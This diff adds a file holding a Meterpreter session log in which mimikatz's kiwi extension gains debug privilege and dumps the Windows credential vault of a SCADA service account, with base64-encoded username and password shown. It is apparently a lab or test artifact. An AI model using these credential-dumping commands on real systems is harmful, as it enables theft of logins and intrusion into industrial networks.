@@ -1,0 +1,31 @@
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+meterpreter > load kiwi
+Loading extension kiwi...Success.
+
+meterpreter > kiwi_cmd privilege::debug
+Privilege '20' OK
+
+meterpreter > kiwi_cmd vault::cred /patch
+
+Vault : {77BC582B-F0A6-4E15-4E80-61736B6F3B29}
+        Name      : Windows Credentials
+        Path      : C:\Users\SCADA_SVC\AppData\Roaming\Microsoft\Credentials
+
+ [00000001]
+  TargetName : 10.1.0.20 / <NULL>
+  UserName   : c2E=
+  Comment    : <NULL>
+  Type       : 1 - generic
+  Persist    : 3 - enterprise
+  Flags      : 00000000
+  LastWritten: 4/19/2026 6:02:14 AM
+  Credential : UEBzc3cwcmQxMjM=
+  Attributes : 0
+
+meterpreter >
